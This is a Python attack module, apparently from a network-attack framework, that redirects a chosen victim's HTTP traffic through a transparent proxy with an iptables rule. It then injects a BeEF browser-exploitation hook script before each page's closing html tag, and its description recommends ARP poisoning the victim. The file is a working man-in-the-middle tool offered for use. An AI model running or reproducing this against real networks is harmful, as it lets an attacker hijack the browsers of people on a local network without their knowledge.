from attack import Attack
from libmproxy import controller, proxy, platform
from threading import Thread
from zoption import Zoption
import util


class beef_hook(Attack):
    """ Injects BeEF hooks into poisoned traffic.  Requires libmproxy
        and it's dependencies
    """
    def __init__(self):
        super(beef_hook, self).__init__("BeEF Hook")
        self.proxy_server = None
        self.hooker       = None
        self.hook_script  = "<script src=\"{0}\"></script>"
        self.iptable_http = "iptables -t nat -A PREROUTING -p tcp --dport 80 -s {0} -j REDIRECT --to-port 5544"
        self.config.update({"hook_path":Zoption(type = "str",
                                          value = None,
                                          required = True,
                                          display = "Path to BeEF hook"),
                            "hooked_host": Zoption(type = "ip",
                                            value = None,
                                            required = True,
                                            display = "Host to hook")
                            })
        self.info = """
                    BeEF (Browser Exploitation Framework) is a tool used in
                    the exploitation of browsers.  This module serves as a
                    way to hook any browser without the need for an XSS
                    or other malicious client-facing vector.  Instead,
                    when an attacker is local to a victim, this module
                    will inject each page with a hook.

                    ARP poisoning the victim is suggested, as traffic from
                    the victim is required."""

    def modip_rule(self, enable=True):
        """ enables or disables the iptable rule for forwarding traffic locally
        """
        if enable:
            util.init_app(self.iptable_http.format
                                    (self.config['hooked_host'].value))
        else:
            util.init_app(self.iptable_http.replace('-A', '-D').format
                                            (self.config['hooked_host'].value))

    def initialize(self):
        self.hook_script = self.hook_script.format(self.config['hook_path'].value)
        self.modip_rule()

        self.running = True
        config = proxy.ProxyConfig(transparent_proxy=dict(
                                        resolver = platform.resolver(),
                                        sslports = [443])
                                )

        config.skip_cert_cleanup = True
        self.proxy_server = proxy.ProxyServer(config, 5544)
        self.hooker = Hooker(self.proxy_server, self.hook_script)

        util.Msg('Firing up BeEF hook...')
        thread = Thread(target=self.hooker.run)
        thread.start()

        return True

    def shutdown(self):
        """ Disable the iptable rule and kill the proxy server
        """
        util.Msg("Shutting down BeEF hooks...")
        self.modip_rule(False)
        self.proxy_server.shutdown()
        self.hooker.shutdown()

    def session_view(self):
        """ Return the host we're hooking
        """
        return self.config['hooked_host'].value


class Hooker(controller.Master):
    """ Request handler for libmproxy; takes care of our
        replaces.
    """
    def __init__(self, server, script_hook):
        controller.Master.__init__(self, server)
        self.script_hook = script_hook

    def run(self):
        try:
            return controller.Master.run(self)
        except:
            self.shutdown()

    def handle_response(self, msg):
        """ Replace an end </html> tag with the hook; every HTTP page
            should have this.
        """
        msg.replace("</html>", "{0}</html>".format(self.script_hook))
        msg.replace("</HTML>", "{0}</HTML>".format(self.script_hook))
        msg.reply()
